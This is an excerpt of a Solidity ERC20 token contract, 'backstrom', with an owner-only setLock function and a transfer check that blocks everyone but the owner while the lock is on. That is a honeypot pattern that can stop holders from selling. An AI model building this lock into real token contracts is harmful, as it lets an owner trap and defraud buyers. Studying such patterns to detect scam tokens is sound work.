...
contract backstrom is Context, IERC20, Ownable {
    ...
    uint256 public _maxTxAmount = 21000000 * 10**6;
    uint256 private numTokensSellToAddToLiquidity = 21000 * 10**6;
    ...
    function setLock(bool state) public onlyOwner {
        lock = state;
    }
    ...
    function _transfer(
        ...
        require((_msgSender() == owner()) || (lock == false), "ERC20: token is lock");
